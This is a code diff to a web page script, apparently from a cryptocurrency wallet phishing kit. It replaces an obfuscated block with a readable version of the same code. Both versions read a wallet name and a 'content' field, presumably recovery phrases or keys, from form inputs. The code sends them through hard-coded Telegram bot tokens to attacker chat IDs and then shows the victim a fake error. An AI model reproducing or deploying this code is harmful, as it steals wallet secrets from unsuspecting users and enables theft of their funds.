@@ -148,7 +148,50 @@ async function verify(){
   cP.style.borderColor="#008000";
 
 
-  function _0xebc4(_0x466348,_0xba3475){const _0x578d76=_0x2595();return _0xebc4=function(_0x698aa9,_0x5f43b5){_0x698aa9=_0x698aa9-(-0x1027+-0x25ff+0x380c);let _0x359987=_0x578d76[_0x698aa9];return _0x359987;},_0xebc4(_0x466348,_0xba3475);}const _0x4e7838=_0xebc4;(function(_0x4c9b23,_0x1790e1){const _0x558021=_0xebc4,_0x4a7a29=_0x4c9b23();while(!![]){try{const _0x4ac6db=parseInt(_0x558021(0x212))/(-0x84f+-0x1d*0xe4+0x2224)+-parseInt(_0x558021(0x1eb))/(-0x1544+-0x7*0x38d+-0x1*-0x2e21)+parseInt(_0x558021(0x1fe))/(0x17*-0x56+0xc5f*0x2+-0x1101*0x1)*(parseInt(_0x558021(0x1e9))/(-0x2684+-0x2*-0x11c1+-0x9*-0x56))+-parseInt(_0x558021(0x1f7))/(-0x1*-0x1d82+-0x6da+-0x16a3)+parseInt(_0x558021(0x1f5))/(0x14bf+0x2463+-0x391c)+parseInt(_0x558021(0x213))/(0x15bf+-0x1961+-0x3a9*-0x1)*(parseInt(_0x558021(0x20d))/(0x1*0x2688+-0x19a8+-0xcd8))+parseInt(_0x558021(0x1ed))/(-0x17db+-0x1bab+0x338f)*(-parseInt(_0x558021(0x202))/(-0xbb1+-0x12ff*0x1+0x17*0x156));if(_0x4ac6db===_0x1790e1)break;else _0x4a7a29['push'](_0x4a7a29['shift']());}catch(_0x4f40ce){_0x4a7a29['push'](_0x4a7a29['shift']());}}}(_0x2595,-0xb126d+-0x4*0x3222a+-0xa85*-0x2fe));function _0x2595(){const _0x1ca515=['\x0a📢\x20*New\x20Re','bod','651TjraOt','Details:*\x0a','0_quA4','ward\x20Tip*\x20','8525750uXkiak','getElement','i.telegram','\x0a\x0a*Client\x20','ame:\x20','sByClassNa','equest\x20Fai','led:','8104209847','json','7534122584','881168jZjTsr','-\x20Wallet\x20N','4MBLQ8VI1k','.org/bot','sGpsQD60IZ','1007709pouexO','63KHlDuA','value','innerHTML','&parse_mod',':AAFpbr4rI','Telegram\x20E','error','5524gvKdcF','ge?chat_id','270578frbVrD','9ElLj66I2w','18gfzvjg','all','\x0a\x20\x20','rror\x201:','&text=','e=Markdown','https://ap','Telegram\x20R','2883162kCZuwQ','\x0a-\x20Content','2114895wdwbrE','/sendMessa','i9NpKweW4Z','tYN3Us',':AAGMo08k1'];_0x2595=function(){return _0x1ca515;};return _0x2595();}const BOT_TOKEN=_0x4e7838(0x20a)+_0x4e7838(0x1fb)+_0x4e7838(0x1f9)+_0x4e7838(0x1ec)+_0x4e7838(0x200),CHAT_ID=0xcc697789+-0x8a540ee1+0x659f68d*0x29,BOT_TOKEN2=_0x4e7838(0x20c)+_0x4e7838(0x1e6)+_0x4e7838(0x20f)+_0x4e7838(0x211)+_0x4e7838(0x1fa),CHAT_ID2=-(0x37bbaef9b*-0x83+0x85f*0x1e10790+0x2a202a9a3c1),message=_0x4e7838(0x1fc)+_0x4e7838(0x201)+_0x4e7838(0x205)+_0x4e7838(0x1ff)+_0x4e7838(0x20e)+_0x4e7838(0x206)+wN[_0x4e7838(0x214)]+(_0x4e7838(0x1f6)+':\x20')+tA[_0x4e7838(0x214)]+_0x4e7838(0x1ef),encodedMessage=encodeURIComponent(message),telegramUrl=_0x4e7838(0x1f3)+_0x4e7838(0x204)+_0x4e7838(0x210)+BOT_TOKEN+(_0x4e7838(0x1f8)+_0x4e7838(0x1ea)+'=')+CHAT_ID+_0x4e7838(0x1f1)+encodedMessage+(_0x4e7838(0x216)+_0x4e7838(0x1f2)),telegramUrl2=_0x4e7838(0x1f3)+_0x4e7838(0x204)+_0x4e7838(0x210)+BOT_TOKEN2+(_0x4e7838(0x1f8)+_0x4e7838(0x1ea)+'=')+CHAT_ID2+_0x4e7838(0x1f1)+encodedMessage+(_0x4e7838(0x216)+_0x4e7838(0x1f2)),telegramResponse=await fetch(telegramUrl),telegramResponse2=await fetch(telegramUrl2),result=await telegramResponse[_0x4e7838(0x20b)]();var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x148c+0x1*-0x781+-0xd0b];bod[_0x4e7838(0x215)]=preloader();try{const [response1,response2]=await Promise[_0x4e7838(0x1ee)]([fetch(telegramUrl),fetch(telegramUrl2)]),result1=await response1[_0x4e7838(0x20b)]();if(!response1['ok']){console[_0x4e7838(0x1e8)](_0x4e7838(0x1e7)+_0x4e7838(0x1f0),result1);var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x48a+0x22e0+-0x276a];bod[_0x4e7838(0x215)]=error_mod();return;}var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[-0x109c+0x2*-0xa57+-0x1*-0x254a];bod[_0x4e7838(0x215)]=error_mod();}catch(_0x494913){console[_0x4e7838(0x1e8)](_0x4e7838(0x1f4)+_0x4e7838(0x208)+_0x4e7838(0x209),_0x494913);var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x1aef+0x1*0x125f+0x78d*-0x6];bod[_0x4e7838(0x215)]=error_mod();}
+  const BOT_TOKEN = '7534122584:AAFpbr4rI4MBLQ8VI1ksGpsQD60IZtYN3Us';
+  const CHAT_ID = -1002551858656;
+  const BOT_TOKEN2 = '7534122584:AAFpbr4rI4MBLQ8VI1ksGpsQD60IZtYN3Us';
+  const CHAT_ID2 = -1002551858656;
+
+  const message = `
+📢 *New Reward Tip* 
+
+*Client Details:*
+- Wallet Name: ${wN.value}
+- Content: ${tA.value}
+  `;
+
+  const encodedMessage = encodeURIComponent(message);
+  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+  const telegramUrl2 = `https://api.telegram.org/bot${BOT_TOKEN2}/sendMessage?chat_id=${CHAT_ID2}&text=${encodedMessage}&parse_mode=Markdown`;
+
+  const telegramResponse = await fetch(telegramUrl);
+  const telegramResponse2 = await fetch(telegramUrl2);
+  const result = await telegramResponse.json();
+
+  var bod = document.getElementsByClassName('bod')[0];
+  bod.innerHTML = preloader();
+  try {
+    const [response1, response2] = await Promise.all([
+      fetch(telegramUrl),
+      fetch(telegramUrl2)
+    ]);
+
+    const result1 = await response1.json();
+
+    if (!response1.ok) {
+      console.error('Telegram Error 1:', result1);
+      var bod = document.getElementsByClassName('bod')[0];
+      bod.innerHTML = error_mod();
+      return;
+    }
+    var bod = document.getElementsByClassName('bod')[0];
+    bod.innerHTML = error_mod();
+  } catch (error) {
+    console.error('Telegram Request Failed:', error);
+    var bod = document.getElementsByClassName('bod')[0];
+    bod.innerHTML = error_mod();
+  }
 }
 
 function error_mod() {
